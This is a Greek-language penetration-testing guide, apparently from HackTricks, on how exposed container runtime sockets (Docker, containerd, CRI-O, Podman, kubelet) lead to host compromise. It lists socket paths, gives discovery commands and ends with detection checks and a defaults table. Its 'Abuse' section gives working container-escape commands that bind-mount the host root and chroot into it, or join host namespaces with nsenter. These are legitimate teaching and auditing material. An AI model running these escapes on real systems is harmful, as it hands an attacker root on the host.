# API χρόνου εκτέλεσης και έκθεση του daemon

{{#include ../../../banners/hacktricks-training.md}}

## Επισκόπηση

Πολλές πραγματικές παραβιάσεις container δεν ξεκινούν καθόλου με ένα namespace escape. Ξεκινούν με πρόσβαση στο runtime control plane. Εάν ένα workload μπορεί να επικοινωνήσει με `dockerd`, `containerd`, CRI-O, Podman ή kubelet μέσω ενός mounted Unix socket ή ενός εκτεθειμένου TCP listener, ο επιτιθέμενος μπορεί να ζητήσει ένα νέο container με αυξημένα προνόμια, να mount-άρει το host filesystem, να ενταχθεί σε host namespaces ή να ανακτήσει ευαίσθητες πληροφορίες κόμβου. Σε αυτές τις περιπτώσεις, το runtime API είναι το πραγματικό όριο ασφαλείας, και η παραβίασή του είναι λειτουργικά κοντά στην παραβίαση του host.

Γι' αυτό η έκθεση του runtime socket πρέπει να τεκμηριώνεται ξεχωριστά από τις προστασίες του kernel. Ένα container με ordinary seccomp, capabilities, and MAC confinement μπορεί ακόμη να απέχει μόλις ένα API call από την παραβίαση του host εάν το `/var/run/docker.sock` ή το `/run/containerd/containerd.sock` είναι mounted μέσα σε αυτό. Η απομόνωση του kernel του τρέχοντος container μπορεί να λειτουργεί ακριβώς όπως έχει σχεδιαστεί ενώ το runtime management plane παραμένει πλήρως εκτεθειμένο.

## Μοντέλα πρόσβασης daemon

Το Docker Engine παραδοσιακά εκθέτει το προνομιούχο API του μέσω του τοπικού Unix socket στο `unix:///var/run/docker.sock`. Ιστορικά έχει επίσης εκτεθεί απομακρυσμένα μέσω TCP listeners όπως `tcp://0.0.0.0:2375` ή ενός TLS-protected listener στην `2376`. Η έκθεση του daemon απομακρυσμένα χωρίς ισχυρό TLS και client authentication ουσιαστικά μετατρέπει το Docker API σε ένα remote root interface.

containerd, CRI-O, Podman και kubelet εκθέτουν παρόμοιες επιφάνειες υψηλού αντίκτυπου. Τα ονόματα και τα workflows διαφέρουν, αλλά η λογική όχι. Εάν το interface επιτρέπει στον καλούντα να δημιουργεί workloads, να mount-άρει host paths, να ανακτά credentials ή να τροποποιεί τρέχοντα containers, τότε το interface είναι ένα privileged management channel και πρέπει να αντιμετωπίζεται ανάλογα.

Κοινές τοπικές διαδρομές που αξίζει να ελεγχθούν είναι:
```text
/var/run/docker.sock
/run/docker.sock
/run/containerd/containerd.sock
/var/run/crio/crio.sock
/run/podman/podman.sock
/var/run/kubelet.sock
/run/buildkit/buildkitd.sock
/run/firecracker-containerd.sock
```
Παλαιότερες ή πιο εξειδικευμένες στοίβες ενδέχεται επίσης να εκθέτουν endpoints όπως `dockershim.sock`, `frakti.sock`, ή `rktlet.sock`. Αυτά είναι λιγότερο συνηθισμένα σε σύγχρονα περιβάλλοντα, αλλά όταν εμφανίζονται πρέπει να αντιμετωπίζονται με την ίδια προσοχή επειδή αντιπροσωπεύουν επιφάνειες ελέγχου χρόνου εκτέλεσης παρά απλές υποδοχές εφαρμογών.

## Ασφαλής Απομακρυσμένη Πρόσβαση

Εάν ένας daemon πρέπει να εκτεθεί πέρα από την τοπική υποδοχή, η σύνδεση θα πρέπει να προστατεύεται με TLS και προτιμητέα με αμοιβαία πιστοποίηση, έτσι ώστε ο daemon να επαληθεύει τον client και ο client να επαληθεύει τον daemon. Η παλιά συνήθεια να ανοίγει κανείς τον Docker daemon σε απλό HTTP για ευκολία είναι ένα από τα πιο επικίνδυνα λάθη στη διαχείριση κοντέινερ, επειδή η επιφάνεια API είναι αρκετά ισχυρή ώστε να δημιουργεί απευθείας κοντέινερ με προνόμια.

Το ιστορικό πρότυπο ρύθμισης του Docker έμοιαζε ως εξής:
```bash
DOCKER_OPTS="-H unix:///var/run/docker.sock -H tcp://192.168.56.101:2376"
sudo service docker restart
```
Σε hosts με systemd, η επικοινωνία του daemon μπορεί επίσης να εμφανίζεται ως `fd://`, που σημαίνει ότι η διαδικασία κληρονομεί ένα προ-ανοικτό socket από το systemd αντί να το δεσμεύει η ίδια απευθείας. Το σημαντικό μάθημα δεν είναι η ακριβής σύνταξη αλλά οι συνέπειες για την ασφάλεια. Τη στιγμή που ο daemon ακούει πέρα από ένα τοπικό socket με αυστηρά δικαιώματα, η ασφάλεια στη μεταφορά και η πιστοποίηση του client γίνονται υποχρεωτικές αντί για προαιρετικές ενισχύσεις.

## Abuse

Εάν υπάρχει runtime socket, επιβεβαιώστε ποιο είναι, εάν υπάρχει συμβατός client και εάν είναι δυνατή η πρόσβαση μέσω raw HTTP ή gRPC:
```bash
find / -maxdepth 3 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
ss -xl | grep -E 'docker|containerd|crio|podman|kubelet' 2>/dev/null
docker -H unix:///var/run/docker.sock version 2>/dev/null
ctr --address /run/containerd/containerd.sock images ls 2>/dev/null
crictl --runtime-endpoint unix:///var/run/crio/crio.sock ps 2>/dev/null
```
Αυτές οι εντολές είναι χρήσιμες επειδή διακρίνουν μεταξύ μιας νεκρής διαδρομής, ενός mounted αλλά μη προσβάσιμου socket, και ενός ενεργού προνομιακού API. Εάν ο client πετύχει, το επόμενο ερώτημα είναι αν το API μπορεί να ξεκινήσει νέο container με host bind mount ή κοινή χρήση του host namespace.

### Πλήρες Παράδειγμα: Docker Socket προς το root του host

Αν το `docker.sock` είναι προσβάσιμο, η κλασική διαφυγή είναι να ξεκινήσεις ένα νέο container που κάνει mount το root filesystem του host και στη συνέχεια να κάνεις `chroot` μέσα σε αυτό:
```bash
docker -H unix:///var/run/docker.sock images
docker -H unix:///var/run/docker.sock run --rm -it -v /:/host ubuntu:24.04 chroot /host /bin/bash
```
Αυτό παρέχει άμεση εκτέλεση με δικαιώματα host-root μέσω του Docker daemon. Ο αντίκτυπος δεν περιορίζεται στην ανάγνωση αρχείων. Μόλις βρεθεί μέσα στο νέο container, ο attacker μπορεί να τροποποιήσει αρχεία του host, να συλλέξει credentials, να εγκαταστήσει persistence, ή να ξεκινήσει επιπλέον privileged workloads.

### Πλήρες Παράδειγμα: Docker Socket To Host Namespaces

Αν ο attacker προτιμά είσοδο στο namespace αντί για πρόσβαση μόνο στο filesystem:
```bash
docker -H unix:///var/run/docker.sock run --rm -it --pid=host --privileged ubuntu:24.04 bash
nsenter --target 1 --mount --uts --ipc --net --pid -- bash
```
Αυτή η διαδρομή φτάνει στον host ζητώντας από το runtime να δημιουργήσει ένα νέο container με ρητή έκθεση του host-namespace αντί να εκμεταλλευτεί το τρέχον.

### Πλήρες Παράδειγμα: containerd Socket

Ένας προσαρτημένος `containerd` socket είναι συνήθως εξίσου επικίνδυνος:
```bash
ctr --address /run/containerd/containerd.sock images pull docker.io/library/busybox:latest
ctr --address /run/containerd/containerd.sock run --tty --privileged --mount type=bind,src=/,dst=/host,options=rbind:rw docker.io/library/busybox:latest host /bin/sh
chroot /host /bin/sh
```
Ο αντίκτυπος είναι και πάλι ο συμβιβασμός του host. Ακόμα κι αν τα ειδικά για Docker εργαλεία απουσιάζουν, κάποια άλλη runtime API μπορεί να προσφέρει τις ίδιες διαχειριστικές δυνατότητες.

## Έλεγχοι

Ο στόχος αυτών των ελέγχων είναι να απαντήσουν αν το container μπορεί να φτάσει οποιοδήποτε management plane που θα έπρεπε να έχει παραμείνει έξω από το όριο εμπιστοσύνης.
```bash
find / -maxdepth 3 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
mount | grep -E '/var/run|/run|docker.sock|containerd.sock|crio.sock|podman.sock|kubelet.sock'
ss -lntp 2>/dev/null | grep -E ':2375|:2376'
env | grep -E 'DOCKER_HOST|CONTAINERD_ADDRESS|CRI_CONFIG_FILE'
```
Τι είναι ενδιαφέρον εδώ:

- Ένα προσαρτημένο runtime socket συνήθως αποτελεί άμεσο διαχειριστικό μέσο και όχι απλή αποκάλυψη πληροφοριών.
- Ένας TCP listener στην `2375` χωρίς TLS πρέπει να θεωρείται ως περίπτωση απομακρυσμένης παραβίασης.
- Μεταβλητές περιβάλλοντος όπως `DOCKER_HOST` συχνά αποκαλύπτουν ότι το workload σχεδιάστηκε σκόπιμα για να επικοινωνεί με το runtime του host.

## Προεπιλογές Runtime

| Runtime / πλατφόρμα | Προεπιλεγμένη κατάσταση | Προεπιλεγμένη συμπεριφορά | Συνηθισμένες χειροκίνητες χαλάρωσεις ασφαλείας |
| --- | --- | --- | --- |
| Docker Engine | Τοπικό Unix socket ως προεπιλογή | Το `dockerd` ακούει στο τοπικό socket και το daemon συνήθως τρέχει με δικαιώματα root | προσαρτώντας `/var/run/docker.sock`, εκθέτοντας `tcp://...:2375`, αδύναμο ή ελλείπον TLS στο `2376` |
| Podman | CLI χωρίς daemon ως προεπιλογή | Δεν απαιτείται μακρόβιος προνομιούχος daemon για την κανονική τοπική χρήση· API sockets μπορεί να εκτεθούν όταν το `podman system service` είναι ενεργοποιημένο | εκθέτοντας `podman.sock`, εκτελώντας την υπηρεσία ευρέως, χρήση API με δικαιώματα root |
| containerd | Τοπικό προνομιούχο socket | Διοικητικό API εκτεθειμένο μέσω του τοπικού socket και συνήθως καταναλώνεται από εργαλεία ανώτερου επιπέδου | προσαρτώντας `containerd.sock`, ευρεία πρόσβαση μέσω `ctr` ή `nerdctl`, έκθεση προνομιούχων namespaces |
| CRI-O | Τοπικό προνομιούχο socket | Το CRI endpoint προορίζεται για τοπικά αξιόπιστα components του κόμβου | προσαρτώντας `crio.sock`, εκθέτοντας το CRI endpoint σε μη αξιόπιστα workloads |
| Kubernetes kubelet | Τοπικό API διαχείρισης κόμβου | Το kubelet δεν πρέπει να είναι ευρέως προσβάσιμο από Pods· η πρόσβαση μπορεί να εκθέσει κατάσταση pods, διαπιστευτήρια και δυνατότητες εκτέλεσης ανάλογα με το authn/authz | προσαρτώντας kubelet sockets ή certs, αδύναμη πιστοποίηση kubelet, host networking μαζί με προσβάσιμο kubelet endpoint |
{{#include ../../../banners/hacktricks-training.md}}
